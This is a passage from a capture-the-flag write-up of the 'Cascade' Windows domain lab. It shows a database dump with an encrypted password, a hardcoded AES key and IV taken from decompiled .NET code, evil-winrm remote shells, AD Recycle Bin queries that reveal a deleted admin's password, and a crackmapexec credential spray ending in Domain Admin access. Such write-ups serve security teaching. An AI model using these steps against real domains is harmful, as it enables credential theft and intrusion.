sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> .dump DeletedUserAudit 
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
COMMIT;
sqlite> .dump Ldap
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
COMMIT;
sqlite>
```

I started by dumping the `DeletedUserAudit` table, which showed that the `TempAdmin` user I'd been chasing had been deleted! Maybe some leftover of that account would yield his admin credentials. Next I dumped the database's `Ldap` table, which contained only a handful of statements, among them `INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');` that looked like a stored password for the `ArkScv` account I wanted to pivot into. The remaining task was to identify how it had been encrypted \(plain base64 it was not, unfortunately\).

![](assets/wu/cascade/fix-4.png)

Since I'd already seen `CascAudit.exe` interact with the database, I felt confident it was tied to the encryption.  The `CascCrypto.dll` sitting in the same folder only reinforced that hunch.  I loaded both files into [ILSpy](https://github.com/icsharpcode/AvaloniaILSpy), hoping they were .NET builds.  Fortunately they were, and the decompiled source appeared.  I almost immediately found the line `password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");`, which revealed both the decryption routine and what was almost certainly a hardcoded key.  

![](assets/wu/cascade/img-3.png)

I lifted the decryption method out of `CascCrypto.dll` and the key out of the executable, then dropped the code into [dotnetfiddle.net](https://dotnetfiddle.net) to compile and run it. 

Even without being comfortable writing a little C\# to make the code run, everything you'd need for an alternative approach is right there in the source.  The cipher is AES in CBC mode with a 128-bit key and block size and an IV of 1tdyjCbY1lx49842.  Armed with that, the known ciphertext, and the key, I could have decrypted the password with all sorts of languages, scripts, or even web tools \(one of my go-to sites for this kind of decoding being [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)\).

![](assets/wu/cascade/img-4.png)

After a bit of tweaking to turn the code into a standalone program, it spat out the password `w3lc0meFr31nd`.  _I'm not certain what the garbled characters in the output were, but happily ignoring them caused no trouble when logging in with this password._

### Moving Laterally to `arksvc`

```text
kac0@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i <YOUR_IP>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Disappointing, I'd been counting on this user holding **SeBackupPrivilege**. So much for the quick win. The `AD Recycle Bin` group did look interesting, though. Reading up on it, I came across a blog covering how to abuse it at [https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/).  It even threw in a piece of trivia that tied right back to this box:

> The Active Directory Recycle Bin first shipped with the Windows Server 2008 R2 release.

Based on the blog, it seemed I could resurrect the deleted `TempAdmin` account I'd come across while going through the database.

```text
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

Running that command from the article returns:

```text
Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

There's the `TempAdmin` user we were after. Per the blog, restoring it is just a matter of `Restore-ADObject -Identity "<ObjectGUID>"`. 

```text
*Evil-WinRM* PS C:\Program Files (x86)> Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
Insufficient access rights to perform the operation
At line:1 char:1
+ Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
```

Well, that's a dead end...so what else can `arksvc` do with a deleted account? I trimmed the command down to compare how the output changed.

```text
*Evil-WinRM* PS C:\Program Files (x86)> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

--snipped--
CanonicalName                   : cascade.local/Deleted Objects/User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
CN                              : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : User
Name                            : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

For a supposedly deleted account, an awful lot of data was still hanging around! A few other deleted objects showed up too, but the extra detail attached to the `TempAdmin` object had everything I needed. It carried another base64-encoded **CascLegacyPwd**.

```text
kac0@kalimaa:~/htb/cascade$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Base64-decoding `YmFDVDNyMWFOMDBkbGVz` yielded the password `baCT3r1aN00dles`.

## **Getting an Administrator shell**

```text
kac0@kalimaa:~/htb/cascade$ crackmapexec winrm -u users -p passwords -d Cascade <YOUR_IP>
WINRM       <YOUR_IP>    5985   CASC-DC1         [*] http://<YOUR_IP>:5985/wsman
WINRM       <YOUR_IP>    5985   CASC-DC1         [-] Cascade\Administrator:rY4n5eva "the specified credentials were rejected by the server"
WINRM       <YOUR_IP>    5985   CASC-DC1         [-] Cascade\Administrator:sT333ve2 "the specified credentials were rejected by the server"
WINRM       <YOUR_IP>    5985   CASC-DC1         [-] Cascade\Administrator:w3lc0meFr31nd "the specified credentials were rejected by the server"
WINRM       <YOUR_IP>    5985   CASC-DC1         [+] Cascade\Administrator:baCT3r1aN00dles (Pwn3d!)
```

_Pwn3d!_

### **Root.txt**

With the `TempAdmin` password in hand, ****which the earlier notes said matched the regular Administrator account, I could finally log into an Administrator shell and collect my hard-earned loot.

```text
kac0@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i <YOUR_IP>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/26/2020   8:56 AM             34 root.txt
-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c819************************d488
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== =============================================
cascade\administrator S-1-5-21-3332504370-1206983947-1165150453-500

GROUP INFORMATION
-----------------

Group Name                                     Type             SID                                            Attributes
============================================== ================ ============================================== ===============================================================
Everyone                                       Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                         Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                  Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Domain Admins                          Group            S-1-5-21-3332504370-1206983947-1165150453-512  Mandatory group, Enabled by default, Enabled group
CASCADE\Group Policy Creator Owners            Group            S-1-5-21-3332504370-1206983947-1165150453-520  Mandatory group, Enabled by default, Enabled group
CASCADE\Schema Admins                          Group            S-1-5-21-3332504370-1206983947-1165150453-518  Mandatory group, Enabled by default, Enabled group
CASCADE\Enterprise Admins                      Group            S-1-5-21-3332504370-1206983947-1165150453-519  Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                             Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Denied RODC Password Replication Group Alias            S-1-5-21-3332504370-1206983947-1165150453-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level           Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                                    State
=============================== ============================================================== =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process                             Enabled
SeMachineAccountPrivilege       Add workstations to domain                                     Enabled
SeSecurityPrivilege             Manage auditing and security log                               Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects                       Enabled
SeLoadDriverPrivilege           Load and unload device drivers                                 Enabled
SeSystemProfilePrivilege        Profile system performance                                     Enabled
SeSystemtimePrivilege           Change the system time                                         Enabled
SeProfileSingleProcessPrivilege Profile single process                                         Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority                                   Enabled
SeCreatePagefilePrivilege       Create a pagefile                                              Enabled
SeBackupPrivilege               Back up files and directories                                  Enabled
SeRestorePrivilege              Restore files and directories                                  Enabled
SeShutdownPrivilege             Shut down the system                                           Enabled
SeDebugPrivilege                Debug programs                                                 Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values                             Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system                            Enabled
SeUndockPrivilege               Remove computer from docking station                           Enabled
SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks                               Enabled
SeImpersonatePrivilege          Impersonate a client after authentication                      Enabled
SeCreateGlobalPrivilege         Create global objects                                          Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled
SeTimeZonePrivilege             Change the time zone                                           Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                                          Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```
